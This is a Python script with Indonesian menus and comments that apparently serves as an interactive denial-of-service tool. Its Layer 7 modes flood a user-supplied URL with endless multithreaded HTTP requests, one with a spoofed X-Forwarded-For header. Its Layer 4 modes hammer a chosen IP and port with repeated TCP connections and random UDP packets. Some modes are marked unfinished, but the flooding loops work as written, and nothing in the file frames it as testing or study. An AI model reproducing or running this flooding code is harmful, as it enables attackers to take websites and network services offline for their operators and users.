import requests
import socket
import threading
import os
import random
import sys
import time

# Fungsi untuk mewarnai teks
def colorize(text, color_code):
    return f"\033[{color_code}m{text}\033[0m"

def layer7_attack(target_url, threads, attack_type):
    print(colorize("[*] Starting Layer 7 Attack ({}) to {} with {} threads...".format(attack_type, target_url, threads), 32))

    def attack():
        while True:
            try:
                if attack_type == "zombie":
                    # Zombie DDoS (belum diimplementasikan sepenuhnya)
                    requests.get(target_url) 
                elif attack_type == "crash":
                    # Crash (belum diimplementasikan sepenuhnya)
                    requests.get(target_url, headers={"X-Forwarded-For": "127.0.0.1"})
                elif attack_type == "disconnect":
                    # Disconnect (belum diimplementasikan sepenuhnya)
                    requests.get(target_url, stream=True)
            except:
                pass

    for i in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()
        print(colorize(f"Send to {target_url} thread {i+1}", 32))


def layer4_attack(target_ip, target_port, threads, attack_type):
    print(colorize("[*] Starting Layer 4 Attack ({}) to {}:{} with {} threads...".format(attack_type, target_ip, target_port, threads), 32))

    def attack():
        while True:
            try:
                if attack_type == "pematuk":
                    # Pematuk (belum diimplementasikan sepenuhnya)
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.connect((target_ip, target_port))
                        s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                        time.sleep(0.5)
                        s.close()
                elif attack_type == "shotting":
                    # Shotting (belum diimplementasikan sepenuhnya)
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                        s.sendto(random.randbytes(1024), (target_ip, target_port))
                elif attack_type == "bypass":
                    # Bypass (belum diimplementasikan sepenuhnya)
                    pass
                elif attack_type == "ddos":
                    # DDoS (belum diimplementasikan sepenuhnya)
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                        s.sendto(random.randbytes(1024), (target_ip, target_port))
            except:
                pass

    for i in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()
        print(colorize(f"Send to {target_ip} thread {i+1}", 32))


def menu():
    print("Pilih jenis serangan:")
    print("1. Layer 7 Attack (zombie, crash, disconnect)")
    print("2. Layer 4 Attack (pematuk, shotting, bypass, ddos)")
    print("3. Exit")
    pilihan = input("Masukkan pilihan Anda: ")
    return pilihan


while True:
    pilihan = menu()

    if pilihan == '1':
        target_url = input("Masukkan target URL: ")
        threads = int(input("Masukkan jumlah threads: "))
        attack_type = input("Pilih jenis serangan Layer 7 (zombie, crash, disconnect): ")
        layer7_attack(target_url, threads, attack_type)
    elif pilihan == '2':
        target_ip = input("Masukkan target IP: ")
        target_port = int(input("Masukkan target port: "))
        threads = int(input("Masukkan jumlah threads: "))
        attack_type = input("Pilih jenis serangan Layer 4 (pematuk, shotting, bypass, ddos): ")
        layer4_attack(target_ip, target_port, threads, attack_type)
    elif pilihan == '3':
        print("Keluar...")
        break
    else:
        print("Pilihan tidak valid.") 
